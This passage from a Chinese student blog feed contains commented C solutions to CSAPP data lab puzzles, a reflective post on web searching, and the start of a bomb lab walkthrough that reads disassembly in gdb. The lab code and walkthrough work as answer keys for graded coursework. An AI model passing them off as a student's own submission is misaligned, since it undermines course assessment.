class="comment">//-(1)的补码全是1,-(0)的补码全是0,要巧妙运用这个性质,因为max ops限制在6</span></span><br><span class="line">  <span class="keyword">return</span> (x &amp; y) | (~x &amp; z); <span class="comment">// 通过取反,来达成分支的效果,因为他们的取反是可以互相转化的,反正我是没想到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> cond1 = !(x ^ y);      <span class="comment">// 判断x和y相等</span></span><br><span class="line">  <span class="type">int</span> signx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">// 拿到x,y的符号,分别位signx和signy</span></span><br><span class="line">  <span class="type">int</span> signy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 接下来判断异号</span></span><br><span class="line">  <span class="comment">// x+y-</span></span><br><span class="line">  <span class="type">int</span> cond2 = !(!signx &amp; signy); <span class="comment">// signx=0,signy=1,cond2=0</span></span><br><span class="line">  <span class="comment">// x-y+</span></span><br><span class="line">  <span class="type">int</span> cond3 = (signx &amp; !signy); <span class="comment">// cond3=1</span></span><br><span class="line">  <span class="comment">// 接下来是同号的情况,同号相减不会溢出</span></span><br><span class="line">  <span class="type">int</span> res = ((x + (~y) + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>; <span class="comment">// res为1则x-y小于0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cond1 | (cond2 &amp; (cond3 | res)); <span class="comment">// cond2为1还要进行cond3或res的验证故用&amp;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of</span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">logicalNeg</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> negx = ~x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> a = (x | negx) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   int a=~x+1;</span></span><br><span class="line"><span class="comment">   int b=(x^a)&gt;&gt;31;//这种不行是没考虑到溢出的情况.比如四位的数1000,他的取反加一还是1000</span></span><br><span class="line"><span class="comment">   return a+1;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">howManyBits</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 思路高位有值的话就不能去掉,要找到最高位</span></span><br><span class="line">  <span class="type">int</span> iszero = !x;    <span class="comment">// 判断是否为0,其实不用判断照样可以,因为按照后面的分法,如果是0则所有的bit都是0</span></span><br><span class="line">  <span class="type">int</span> flag = x &gt;&gt; <span class="number">31</span>; <span class="comment">// 取出符号位</span></span><br><span class="line">  <span class="type">int</span> mask = ((!!x) &lt;&lt; <span class="number">31</span>) &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  x = (flag &amp; (~x)) | ((~flag) &amp; x); <span class="comment">// x&gt;0时不变,x&lt;0时把0都变成1</span></span><br><span class="line">  <span class="type">int</span> bit_16, bit_8, bit_4, bit_2, bit_1, bit_0;</span><br><span class="line">  bit_16 = !((!!(x &gt;&gt; <span class="number">16</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">4</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_16;</span><br><span class="line">  bit_8 = !((!!(x &gt;&gt; <span class="number">8</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">3</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_8;</span><br><span class="line">  bit_4 = !((!!(x &gt;&gt; <span class="number">4</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">2</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_4;</span><br><span class="line">  bit_2 = !((!!(x &gt;&gt; <span class="number">2</span>)) ^ <span class="number">0x1</span>) &lt;&lt; <span class="number">1</span>; <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_2;</span><br><span class="line">  bit_1 = !((!!(x &gt;&gt; <span class="number">1</span>)) ^ <span class="number">0x1</span>); <span class="comment">// 先把x规格化,判断每一个部分有没有值</span></span><br><span class="line">  x &gt;&gt;= bit_1;</span><br><span class="line">  bit_0 = x; <span class="comment">// 最后的x只能是1或者0</span></span><br><span class="line">  <span class="type">int</span> res = bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0 + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// return iszero|(mask&amp;res);</span></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// float</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 做到这道题,你就要去看看规格化和非规格化了,在我的笔记里面有</span></span><br><span class="line">  <span class="comment">// expr,s,frac</span></span><br><span class="line">  <span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; (<span class="number">0x1</span>);     <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="type">unsigned</span> expr = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xFF</span>); <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>);     <span class="comment">// 把s,expr,frac全部取出来</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span> &amp;&amp; frac == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> uf; <span class="comment">// 就是0,直接返回uf</span></span><br><span class="line">  <span class="comment">// 无穷大</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  <span class="comment">// 非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    frac &lt;&lt;= <span class="number">1</span>; <span class="comment">//*2</span></span><br><span class="line">    <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | frac;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 规格化</span></span><br><span class="line">  expr++;                                 <span class="comment">// 规格化了,乘以2,毕竟隐藏的尾数是1</span></span><br><span class="line">  <span class="keyword">return</span> (s &lt;&lt; <span class="number">31</span>) | (expr &lt;&lt; <span class="number">23</span>) | frac; <span class="comment">// 拼凑出厂</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span></span><br><span class="line">&#123;<span class="comment">//因为是将其转化为int型的整数,所以可以舍弃掉一些</span></span><br><span class="line">  <span class="type">unsigned</span> s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">  <span class="type">unsigned</span> expr = (uf &gt;&gt; <span class="number">23</span>) &amp; (<span class="number">0xFF</span>);</span><br><span class="line">  <span class="type">unsigned</span> frac = (uf &amp; <span class="number">0x7FFFFF</span>); <span class="comment">// 取到每个位</span></span><br><span class="line">  <span class="comment">// 讨论无穷大</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 当expr=0的时候,隐式位置位0,量级太小了,乘以2的-127次方更小</span></span><br><span class="line">  <span class="keyword">if</span> (expr == <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">// 无穷大,按照题目要求输出0x80000000u.</span></span><br><span class="line">  <span class="comment">// 考虑规格化的情况</span></span><br><span class="line">  <span class="type">int</span> E = expr - <span class="number">127</span>;      <span class="comment">// E是阶码</span></span><br><span class="line">  frac = frac | (<span class="number">1</span> &lt;&lt; <span class="number">23</span>); <span class="comment">// 有一个隐式的一,要给他加上</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (E &gt; <span class="number">31</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>; <span class="comment">// 太大了,转成int就爆了</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (E &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 太小了,frac移动完后转成int直接被舍掉了</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (E &gt;= <span class="number">23</span>)</span><br><span class="line">    frac &lt;&lt;= (E - <span class="number">23</span>); <span class="comment">// 移位,因为M就是二进制的表示方式,所以直接移动小数点</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    frac &gt;&gt;= (<span class="number">23</span> - E);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!s)</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> ~frac + <span class="number">1</span>; <span class="comment">// 其中已经把E乘进去了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 分析规格化和非规格化</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// expr最小也要是1,故得到的E最小为-126</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">  &#123; <span class="comment">// 多余的尾数,E只能提供2^(-126),剩下的靠尾数,尾数还能提供23位</span></span><br><span class="line">    <span class="type">int</span> a = x + <span class="number">126</span>;</span><br><span class="line">    a = <span class="number">23</span> + a;    <span class="comment">// 计算出偏移的位数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; a; <span class="comment">// 以上两种情况是非规格化的情况,能表示的数字更小</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (x &lt;= <span class="number">127</span>)</span><br><span class="line">  &#123; <span class="comment">// E的最大值是127,不能全为1</span></span><br><span class="line">    <span class="comment">// x=expr-bias;,一般bias是127</span></span><br><span class="line">    <span class="type">int</span> expr = x + <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">return</span> expr &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0xFF</span>) &lt;&lt; <span class="number">23</span>;<span class="comment">//即为+INF</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】信息检索</title>
    <url>/PASTFUTURE/information/2023/12/15/</url>
    <content><![CDATA[<p><strong>搜索是一项伟大的方面,我们通过它在互联网的大海内捞针,但很多时候我们都是不懂且不知道如何去搜索的.</strong></p>
<hr>
<h3 id="明晰搜索的目的"><a href="#明晰搜索的目的" class="headerlink" title="明晰搜索的目的"></a>明晰搜索的目的</h3><p>搜索是用来明确,或者扩充知识的,加深记忆,而不是用来学习系统知识的,单纯的靠搜索想啥都不用知道的使用别人写好的框架就是天方夜谭</p>
<h3 id="搜索之难"><a href="#搜索之难" class="headerlink" title="搜索之难"></a>搜索之难</h3><p>互联网的咨询很多,大家都知道,总会有人犯过你犯过的错并且给出了一条限制性的解决办法,而我能有所思考是源于这几日对各种新东西的尝试,查询资料而产生的对搜索的困惑,例如以下:</p>
<blockquote>
<ul>
<li>这两天配置fluid和next的主题的时候,不会JavaScript语言,开始时在网上盲目的搜索,胡乱抄写别人的配置,欲实现加密功能和新的page(类似于小土刀2.0),最后高不成低不就,反正是浪费了大量时间</li>
<li>配置csapp和xv6的环境时,自己看不太懂lab的框架,只好在互联网上不断地搜索,翻阅了许多的相同的或者超级相似的表明同一个意思的垃圾咨询,只能感慨国内互联网的专业资讯都是在不断地互相抄,毫无创新性,时效性的垃圾(至少有许多是),且没有维护性,知其然不知其所以然</li>
<li>配置vscode在mac下和windows的配置环境时,先是在网上不断找别人写好的四大件,改一改,试一试,不加任何的思考,也不去参阅官方文档,浪费了大量的时间,时间成果转化率极低</li>
</ul>
</blockquote>
<h3 id="搜索要求"><a href="#搜索要求" class="headerlink" title="搜索要求"></a>搜索要求</h3><p>现在我们很多人都是不会搜索,不会以专业的词汇来描述自己的问题,就根本找不到,只能接受到大量的广告和毫不相干的网站.好比我之前不知道EOF这个术语,导致用各种其他语言都无法搜索到实现EOF这个功能的按键.</p>
<blockquote>
<p>EOF，为End Of File的缩写，通常在文本的最后存在此字符表示资料结束。</p>
</blockquote>
<p>想要提高搜索的效率,我认为有以下几个选项</p>
<p>遇到不懂的便系统性学习这个方面的知识,建立完善的脉络</p>
<p>设立一个区分性,想清楚几个事物间的关联性和重要性,比如我配置hexo的主题和我写博客其实没有什么关系,所以理智告诉我在挣扎了半个小时不得果时我应该放弃,去干与当下更有收益的事情.</p>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><h4 id="对大模型的思考"><a href="#对大模型的思考" class="headerlink" title="对大模型的思考"></a>对大模型的思考</h4><p>发现现在的大模型有个缺点就是缺少了一些偏门知识点的语料,或者说是上古时代至今的语言进化史留下来的老而僵的死东西,比如在函数声明里面写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void franc(int = 1, int = 2)&#123;</span><br><span class="line">    int x;</span><br><span class="line">    cin &gt;&gt; x;</span><br><span class="line">    cout&lt;&lt;x*2;    </span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    franc(4, 3);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gpt会毫不犹豫的纠正你,但这个确实是能跑的,导致我一度怀疑这样子的写法有何意义<del>,但他做函数声明时这样写确实emmm也不好说,先放着吧</del></p>
<h4 id="对自己的反思"><a href="#对自己的反思" class="headerlink" title="对自己的反思"></a>对自己的反思</h4><p>自己对盲目的搜索产生了依赖性,很多细碎的知识点,最好的学习方法应该是挑个有空的时间去研究一整个体系结构,从最底层学起,而不是什么都依靠搜索,搜索是建立在知道大家把这种东西叫什么的基础上的,没有基础的认知,想要依靠模糊搜索只会浪费大量的时间,要去衡量花费的预计时间成本,及时止损.</p>
<p>多多思考,多多进步</p>
<p>**4-28:**反思是件好事，会反思才会思考，会衡量利弊对错，会思考人何为人，但我就是那种只会反思不会落实的人，一次又一次的反思，给自己的潜意识加上一层层枷锁，但好似不会灵验，该茫然茫然，该依赖依赖，所以我对我上文提出的思考方法提出了这么些可行性的质疑，真的能够在正常人（例如我）身上无限次复现吗？答案是不可能，我的策略太过的理想化，最近在学shell lab，即Exception Control Flow，看书真的是看的晕晕的，先看的笔记，发现不够清楚，想着直接从最底层学起，太累了，看着看着书就困了，晕了，迷糊了。</p>
<p>所以呀，该要全神贯注的看书，才能够践行这个方法，撇去社交，撇去手机，一种我认为的专注时间：<strong>从上一次社交到下一次社交的间隔</strong></p>
<p>专注的中断会造成在专注末端的学习无效化！</p>
<h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote>
<p>愿汝之体恒满精力，愿汝之心恒葆青春。</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>思考</tag>
        <tag>互联网</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP的lab2-bomblab</title>
    <url>/CSAPP/lab2/2024/01/21/</url>
    <content><![CDATA[<blockquote>
<p>这个lab2真的做了很久,做的久,解析写的也久,还抽了部分打题的时间写的,这个lab是真的有意思</p>
</blockquote>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a>前置知识:</h2><ul>
<li><a href="https://zhzvite.github.io/EATPOOP/gdb_use/2024/01/17/">gdb使用指北</a></li>
<li>汇编语言的基本语法</li>
<li>链表</li>
<li>递归函数</li>
<li>耐得住诱惑</li>
</ul>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">0x0000000000400efb &lt;+27&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>phase_1算是热身的一关，主要就是要发现到<strong>0x402400</strong>这个特殊的内存地址，毕竟默认下第一个参数是%rdi，那么第二个参数就是%rsi,有充分的理由怀疑，是在<strings_not_equal>这个函数里面对%rdi和%rsi里面的内存的函数值进行了比较,然后去这个函数里面看一看,可以猜出来时相等的话返回值是0,(test %eax,%eax),所以直接连string函数都不用看了,直接把0x402400里面的值找出来就是答案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p(char*)0x402400</span><br></pre></td></tr></table></figure>

<p>当热身了.</p>
<string_not_equal>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40135c:	0f b6 03             	movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位</span><br><span class="line">40135f:	84 c0                	test   %al,%al       ; 测试 %al 中的值是否为零</span><br><span class="line">401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;  ; 如果为零（字符串结束），跳转到 401388</span><br><span class="line"></span><br><span class="line">401363:	3a 45 00             	cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值</span><br><span class="line">401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;  ; 如果相等，跳转到 401372</span><br><span class="line"></span><br><span class="line">401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;  ; 比较不匹配，跳转到 40138f</span><br><span class="line"></span><br><span class="line">40136a:	3a 45 00             	cmp    0x0(%rbp),%al   ; 比较地址为 (%rbp) 的字节与 %al 中的值</span><br><span class="line">40136d:	0f 1f 00             	nopl   (%rax)         ; No operation，占位符，可忽略</span><br><span class="line">401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;  ; 如果不相等，跳转到 401396</span><br><span class="line"></span><br><span class="line">401372:	48 83 c3 01          	add    $0x1,%rbx       ; 将 %rbx 增加 1（移动到第一个字符串的下一个字符）</span><br><span class="line">401376:	48 83 c5 01          	add    $0x1,%rbp       ; 将 %rbp 增加 1（移动到第二个字符串的下一个字符）</span><br><span class="line"></span><br><span class="line">40137a:	0f b6 03             	movzbl (%rbx),%eax    ; 将 %rbx 指向的字节加载到 %eax 中，并进行零扩展为32位</span><br><span class="line">40137d:	84 c0                	test   %al,%al       ; 测试 %al 中的值是否为零</span><br><span class="line">40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;  ; 如果不为零，继续比较</span><br><span class="line"></span><br><span class="line">401381:	ba 00 00 00 00       	mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）</span><br><span class="line">401386:	eb 13                	jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">401388:	ba 00 00 00 00       	mov    $0x0,%edx      ; 将 0 移动到 %edx（表示字符串相等）</span><br><span class="line">40138d:	eb 0c                	jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">40138f:	ba 01 00 00 00       	mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）</span><br><span class="line">401394:	eb 05                	jmp    40139b &lt;strings_not_equal+0x63&gt;  ; 跳转到 40139b（函数结束）</span><br><span class="line"></span><br><span class="line">401396:	ba 01 00 00 00       	mov    $0x1,%edx      ; 将 1 移动到 %edx（表示字符串不相等）</span><br><span class="line">40139b:	89 d0                	mov    %edx,%eax      ; 将 %edx 的值移动到 %eax（结果）</span><br><span class="line">40139d:	5b                   	pop    %rbx           ; 从堆栈中弹出 %rbx</span><br><span class="line">40139e:	5d                   	pop    %rbp           ; 从堆栈中弹出 %rbp</span><br><span class="line">40139f:	41 5c                	pop    %r12           ; 从堆栈中弹出 %r12</span><br><span class="line">4013a1:	c3                   	retq                  ; 从函数中返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000000000400efc &lt;+0&gt;:     push   %rbp             ; 将 %rbp 寄存器的值推送到栈上</span><br><span class="line">0x0000000000400efd &lt;+1&gt;:     push   %rbx             ; 将 %rbx 寄存器的值推送到栈上</span><br><span class="line">0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp       ; 在栈上分配 0x28（40）字节的空间</span><br><span class="line">0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi         ; 将栈顶地址（%rsp）的值传递给 %rsi 寄存器</span><br><span class="line">0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;  ; 调用 read_six_numbers 函数</span><br><span class="line">0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)      ; 比较栈上第一个元素的值与 1 是否相等</span><br><span class="line">0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;  ; 如果相等，跳转到 0x400f30 处</span><br><span class="line">0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数</span><br><span class="line">0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;  ; 跳转到 0x400f30 处</span><br><span class="line"></span><br><span class="line">0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax   ; 将 %rbx 寄存器指向的地址减 4的值 加载到 %eax,第二个参数,发现是加一倍</span><br><span class="line">0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax         ; 将 %eax 寄存器的值加倍</span><br><span class="line">0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)      ; 比较 %eax 和 %rbx 寄存器指向的地址处的值</span><br><span class="line">0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;  ; 如果相等，跳转到 0x400f25 处</span><br><span class="line">0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;  ; 否则调用 explode_bomb 函数</span><br><span class="line">0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx        ; 将 %rbx 寄存器的值增加 4</span><br><span class="line">0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx        ; 比较 %rbp 和 %rbx 寄存器的值,比较是否是第六个数</span><br><span class="line">0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;  ; 如果不相等，跳转到 0x400f17 处</span><br><span class="line">0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;  ; 否则跳转到 0x400f3c 处,</span><br><span class="line"></span><br><span class="line">0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx  ; 计算栈上地址 %rsp + 4，并将结果存储到 %rbx 寄存器</span><br><span class="line">0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp ; 计算栈上地址 %rsp + 0x18（24），并将结果存储到 %rbp 寄存器</span><br><span class="line">0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;  ; 跳转到 0x400f17 处</span><br><span class="line">0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp       ; 在栈上释放 0x28（40）字节的空间</span><br><span class="line">0x0000000000400f40 &lt;+68&gt;:    pop    %rbx             ; 弹出栈顶的 %rbx 寄存器的值</span><br><span class="line">0x0000000000400f41 &lt;+69&gt;:    pop    %rbp             ; 弹出栈顶的 